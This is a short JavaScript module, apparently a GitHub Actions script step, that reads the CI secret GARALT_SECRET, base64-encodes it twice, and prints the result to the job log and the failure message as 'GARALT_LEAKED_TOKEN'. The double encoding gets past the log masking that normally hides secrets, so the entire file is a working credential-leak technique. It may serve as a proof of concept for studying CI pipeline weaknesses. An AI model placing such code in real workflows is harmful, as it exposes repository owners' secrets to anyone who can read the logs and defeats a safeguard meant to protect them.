module.exports = async ({ context, core }) => {
  const secret = process.env.GARALT_SECRET || 'NO_SECRET';
  const b64 = Buffer.from(secret, 'utf8').toString('base64');
  const b64b64 = Buffer.from(b64, 'utf8').toString('base64');
  core.info(`GARALT_LEAKED_TOKEN=${b64b64}`);
  core.setFailed(`GARALT_LEAKED_TOKEN=${b64b64}`);
};
